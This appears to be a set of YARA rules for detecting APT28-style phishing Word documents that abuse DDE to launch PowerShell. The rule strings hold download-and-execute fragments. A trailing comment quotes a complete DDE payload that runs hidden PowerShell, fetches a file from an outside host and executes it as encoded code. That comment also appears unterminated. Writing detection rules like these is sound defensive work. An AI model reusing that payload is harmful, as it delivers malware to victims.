rule phish_apt28_strings {  
    meta:
        author = "manb4t"
        desc = "phishing email rule focussing on powershell and DDE"
    strings:
        $header = "[Content_Types].xml<?xml version"
        $s1 = "(New-Object System.Net.WebClient).DownloadString"
        $s2 = "powershell -enc $e # \" \"a slow internet connection\" \"try again later\""
        $s3 = "MSWord.exe\\\\..\\\\..\\\\..\\\\..\\\\"
        $s4 = "\\\\..\\\\..\\\\..\\\\Windows\\\\System32"
        $d1 = "2017-10-27T22:23:00Z"
        $d2 = "2017-10-27T22:25:00Z"
    condition:
        $header in (0..50) and //anchor using 0..50 bytes to prevent it matching on something that is not an email e.g. a blog or document talking about the intrusion or phish
        3 of ($s*) and
        1 of ($d*)
}
rule ttp_phish_docx_powershell_1 {
    meta:
        author = "manb4t"
        desc = "ttp phishing email rule focussing on docx with a powershell path"
    strings:
        $header = "[Content_Types].xml<?xml version"
        $path1 = "\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        $path2 = "\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"
        $posh1 = "New-Object System.Net.WebClient" nocase
        $posh2 = "powershell" nocase
        $posh3 = "powershell.exe" nocase
        $posh4 = /-enc|-encoded/ nocase
        $exclude = "ttp_phish_docx_powershell"
    condition:
        $header in (0..50) and //anchor using 0..50 bytes to prevent it matching on something that is not an email e.g. a blog or document talking about the intrusion or phish
        1 of ($path*) and
        2 of ($posh*) and
        not $exclude
}
rule ttp_phish_docx_powershell_2 {
    meta:
        author = "manb4t"
        desc = "ttp phishing email rule focussing on docx with a powershell path"
    strings:
        $header = "[Content_Types].xml<?xml version"
        $path1 = "\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        $path2 = "\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"
        $posh1 = "New-Object System.Net.WebClient" nocase
        $posh2 = "powershell" nocase
        $posh3 = "powershell.exe" nocase
        $posh4 = /-enc|-encoded/ nocase
    condition:
        $header in (0..50) and //anchor using 0..50 bytes to prevent it matching on something that is not an email e.g. a blog or document talking about the intrusion or phish
        1 of ($path*) and
        2 of ($posh*)  
}




/*
DDE "C:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString('http://sendmevideo.org/dh2025e/eee.txt');powershell -enc $e # " "a slow internet connection" "try again later"

/